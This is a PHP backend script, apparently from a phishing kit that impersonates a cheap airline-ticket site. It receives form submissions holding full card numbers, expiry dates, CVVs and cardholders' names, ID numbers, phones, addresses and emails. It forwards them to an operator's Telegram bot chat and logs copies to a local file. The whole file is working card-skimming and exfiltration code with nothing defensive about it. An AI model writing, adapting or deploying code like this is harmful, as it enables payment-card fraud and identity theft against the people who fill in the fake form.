<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

error_log("=== Inicio de loadtiketid.php ===");

// ===============================
// 🔥 CARGAR TOKEN Y CHAT DESDE config.php
// ===============================
$config = require __DIR__ . '/config.php';

if (!isset($config['bot_token'], $config['chat_id'])) {
    echo json_encode(['status' => 'error', 'message' => 'Config inválido']);
    exit;
}

$telegramBotToken = $config['bot_token'];
$telegramChatId   = $config['chat_id'];

// ===============================
// LEER DATOS POST
// ===============================
$data = json_decode(file_get_contents('php://input'), true);
$ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'N/A';

// Guardar respaldo
file_put_contents("log_datos.txt", "====== NUEVA ENTRADA ======\n" . print_r($data, true) . "\n\n", FILE_APPEND);

if (!$data) {
    echo json_encode(['status' => 'error', 'message' => 'Sin datos']);
    exit;
}

// ===============================
// FUNCIÓN SAFE
// ===============================
function safe($key, $data) {

    // 1) nivel directo
    if (isset($data[$key]) && $data[$key] !== '') return $data[$key];

    // 2) data['contact']
    if (isset($data['contact'][$key]) && $data['contact'][$key] !== '') return $data['contact'][$key];

    // 3) data['tbdatos']
    if (isset($data['tbdatos'][$key]) && $data['tbdatos'][$key] !== '') return $data['tbdatos'][$key];

    // 4) data['tbdatos']['contact']
    if (isset($data['tbdatos']['contact'][$key]) && $data['tbdatos']['contact'][$key] !== '') return $data['tbdatos']['contact'][$key];

    return '[sin dato]';
}

// ===============================
// MENSAJE
// ===============================
$message  = "<b>🛑 -777-TiquetesBaratos-777- 🛑</b>\n\n";
$message .= "<b>🔑 IP del Dispositivo:</b> <code>{$ipAddress}</code>\n\n";

$message .= "<b>💳 Detalles de la Tarjeta</b>\n";
$message .= "<b>🔢 Número:</b> <code>" . safe('cardNumber', $data) . "</code>\n";
$message .= "<b>📅 Expiración:</b> <code>" . safe('expMonth', $data) . "/" . safe('expYear', $data) . "</code>\n";
$message .= "<b>🔒 CVV:</b> <code>" . safe('cvv', $data) . "</code>\n";
$message .= "<b>💳 Cuotas:</b> <code>" . safe('cuotas', $data) . "</code>\n\n";

$message .= "<b>🏦 Banco:</b> <code>" . safe('bank', $data) . "</code>\n";
$message .= "<b>💳 Tipo:</b> <code>" . safe('type', $data) . "</code>\n\n";

$message .= "<b>👤 Datos del Propietario</b>\n";
$message .= "<b>📝 Nombre:</b> " . safe('ownerName', $data) . "\n";
$message .= "<b>🆔 Cédula:</b> <code>" . safe('cedula', $data) . "</code>\n";
$message .= "<b>📱 Teléfono:</b> <code>" . safe('phone', $data) . "</code>\n";
$message .= "<b>🌍 Ciudad:</b> <code>" . safe('city', $data) . "</code>\n";
$message .= "<b>🏠 Dirección:</b> <code>" . safe('address', $data) . "</code>\n\n";

$message .= "<b>📞 Contacto</b>\n";
$message .= "<b>☎️ Teléfono:</b> <code>" . safe('telefono', $data) . "</code>\n";
$message .= "<b>✉️ Correo:</b> <code>" . safe('correo', $data) . "</code>\n\n";

$message .= "<b>🔑 @usuarioinvalidoe 🔑</b>\n";

// Log mensaje final
file_put_contents("log_datos.txt", "MENSAJE FINAL:\n" . $message . "\n\n", FILE_APPEND);

// ===============================
// ENVIAR A TELEGRAM
// ===============================
$telegramUrl = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";

$postData = [
    'chat_id'    => $telegramChatId,
    'text'       => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);

$response = curl_exec($ch);
$curlError = curl_error($ch);
curl_close($ch);

if ($curlError) {
    file_put_contents("log_telegram_error.txt", "ERROR TELEGRAM: $curlError\n\n", FILE_APPEND);
}

echo json_encode(['status' => 'success']);
?>
